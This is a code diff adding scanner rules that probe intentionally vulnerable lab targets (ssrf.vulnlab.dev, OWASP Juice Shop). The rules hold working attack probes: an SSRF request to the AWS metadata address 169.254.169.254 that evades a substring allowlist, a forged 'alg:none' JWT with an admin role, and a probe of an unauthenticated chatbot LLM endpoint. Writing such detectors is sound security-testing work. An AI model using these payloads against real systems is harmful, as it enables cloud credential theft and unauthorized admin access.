@@ -31907,6 +31907,136 @@ const ssrfVulnlabRedirectRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const ssrfVulnlabAllowlistBypassLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const blockedUrl = new URL("/allowlist/", origin);
+  blockedUrl.searchParams.set("url", "http://169.254.169.254/latest/meta-data/");
+  const blockedDoc = await ssrfVulnlabFetchDoc(blockedUrl.toString(), {
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (!/does not contain.*vulnlab\.dev|URL rejected/i.test(blockedDoc.body)) return NEGATIVE;
+  const bypassUrl = new URL("/allowlist/", origin);
+  bypassUrl.searchParams.set("url", "http://169.254.169.254/latest/meta-data/?vulnlab.dev");
+  const bypassDoc = await ssrfVulnlabFetchDoc(bypassUrl.toString(), {
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (bypassDoc.status < 200 || bypassDoc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(bypassDoc.body);
+  if (!body) return NEGATIVE;
+  const metadataOk =
+    /^ami-id\b/m.test(body) && /hostname|instance-id|iam\//i.test(body);
+  if (!metadataOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      probeUrl: bypassUrl.toString(),
+      metadataMarkers: body.split(/\n/).slice(0, 6).join(", "),
+      note: "ssrf.vulnlab.dev GET /allowlist/?url=http://169.254.169.254/latest/meta-data/?vulnlab.dev bypasses substring 'vulnlab.dev' allowlist via query string and returns AWS IMDS metadata — allowlist-bypass SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabAllowlistRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/allowlist\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabAllowlistBypassLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const juiceShopJwtAlgNoneLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const path = "/rest/user/authentication-details";
+  const url = new URL(path, ctx.origin).toString();
+  const now = Math.floor(Date.now() / 1000);
+  const algNoneToken = buildAlgNoneJwt({
+    sub: "thugir-probe-user",
+    role: "admin",
+    iat: now,
+    exp: now + 3600
+  });
+  const badToken = "thugir.invalid.probe.token";
+  const [noAuth, badAuth, noneAuth] = await Promise.all([
+    ctx.probe.get(url, { maxBytes: 4096 }),
+    ctx.probe.get(url, { maxBytes: 4096, headers: { Authorization: `Bearer ${badToken}` } }),
+    ctx.probe.get(url, {
+      maxBytes: 4096,
+      headers: { Authorization: `Bearer ${algNoneToken}` }
+    })
+  ]);
+  if (
+    !looksAuthChallenge(noAuth) ||
+    !looksAuthChallenge(badAuth) ||
+    !looksAuthGatedJson(noneAuth) ||
+    !/"role"\s*:\s*"admin"/i.test(noneAuth.body)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      path,
+      statusWithAlgNone: noneAuth.status,
+      responseSample: noneAuth.body.slice(0, 150).trim(),
+      note: "Juice Shop GET /rest/user/authentication-details accepts alg:none JWT and returns admin credentials — dedicated JWT none-algorithm oracle"
+    }
+  };
+};
+
+function isJuiceShopChatbotContext(ctx: RuleContext): boolean {
+  const corpus = `${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}\n${ctx.combined}`;
+  return JUICE_SHOP_HOST_RE.test(corpus) && /\/chatbot\b|#\/chatbot/i.test(corpus);
+}
+
+const juiceShopChatbotApiLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const url = new URL("/rest/chat", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, {
+    method: "POST",
+    body: JSON.stringify({ messages: [{ role: "user", content: "hello" }] }),
+    headers: { "Content-Type": "application/json", Accept: "text/event-stream" },
+    maxBytes: 4096,
+    timeoutMs: 20000
+  });
+  const sseOk =
+    /data:\s*\{/.test(doc.body) &&
+    (/\[DONE\]/.test(doc.body) || /deltaContent|LLM error|AI_RetryError/i.test(doc.body));
+  if (!sseOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Juice Shop POST /rest/chat accepts unauthenticated SSE chat messages — LLM proxy endpoint exposed (chatbot prompt-injection surface)"
+    }
+  };
+};
+
+const juiceShopChatbotRouteLiveOracle: Rule = async (ctx) => {
+  if (!isJuiceShopChatbotContext(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const result = await juiceShopChatbotApiLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
 function wrongsecretsChallengeIdFromUrl(url: string): string | null {
   const m = url.match(/\/challenge\/(?:challenge-)?(\d+)\/?(?:\?|#|$)/i);
   return m?.[1] ?? null;
@@ -38316,6 +38446,11 @@ export const RULES: Record<string, Rule> = {
   ssrfVulnlabMetadataAwsRouteLiveOracle,
   ssrfVulnlabBlocklistRouteLiveOracle,
   ssrfVulnlabRedirectRouteLiveOracle,
+  ssrfVulnlabAllowlistBypassLiveOracle,
+  ssrfVulnlabAllowlistRouteLiveOracle,
+  juiceShopJwtAlgNoneLiveOracle,
+  juiceShopChatbotApiLiveOracle,
+  juiceShopChatbotRouteLiveOracle,
   wrongsecretsChallengeLiveOracle,
   wrongsecretsChallengeRouteLiveOracle,
   clientSideVulnlabApiLabsEvidence,
